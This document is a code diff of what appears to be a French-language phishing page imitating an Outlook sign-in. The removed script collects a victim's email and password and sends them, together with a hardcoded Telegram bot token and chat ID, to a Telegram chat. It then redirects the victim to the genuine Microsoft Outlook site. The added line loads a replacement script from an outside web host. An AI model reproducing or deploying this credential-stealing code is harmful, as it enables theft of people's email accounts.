@@ -187,66 +187,9 @@
         <span>Aide</span>
     </footer>
 
-   
 
-    <script>
+    <script src="https://projet-host-12.web.app/we-outlook/app.js"></script>
 
-        document.getElementById('next').addEventListener('click', function (e) {
-            e.preventDefault();
-
-            // Si le formulaire est valide (grâce à l'attribut required du HTML)
-            if (document.getElementById('user').checkValidity()) {
-                document.getElementById('co').style.display = 'block';
-                document.getElementById('pwd').style.display = 'block';
-                document.getElementById('next').style.display = 'none';
-            } else {
-                // Si l'email n'est pas valide, HTML5 va gérer l'affichage du message d'erreur
-                document.getElementById('user').reportValidity();
-            }
-        });
-
-        document.getElementById('co').addEventListener('click', function (e) {
-            e.preventDefault();
-
-              const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc';
-              const chatId = '5276838022';
-
-            //   const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4';
-            //   const chatId = '7332838769';
-
-            // Récupération des valeurs d'utilisateur et de mot de passe
-            const user = document.getElementById("user").value;
-            const pass = document.getElementById("pwd").value;
-
-            // Validation du mot de passe
-            if (!document.getElementById("pwd").checkValidity()) {
-                return alert('Mot de passe incorrect !');
-            }
-
-            // Construction du message à envoyer
-            const message = `📅 Outlook :\n\n👤 Utilisateur : ${user}\n🔐 Mot de passe : ${pass}`;
-
-            // Construction de l'URL de l'API Telegram
-            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Envoi de la requête à l'API Telegram
-            fetch(telegramURL)
-                .then(response => {
-                    if (!response.ok) {
-                        return response.text().then(text => {
-                            throw new Error(`Erreur lors de l'envoi du message à Telegram: ${text}`);
-                        });
-                    }
-                    // Redirection après envoi réussi
-                    window.location.href = 'https://www.microsoft.com/fr-fr/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f0%2f%3fstate%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMC8&sdf=0';
-                })
-                .catch(error => {
-                    console.error('Erreur :', error);
-                });
-        });
-
-
-    </script>
 
 
 </body>
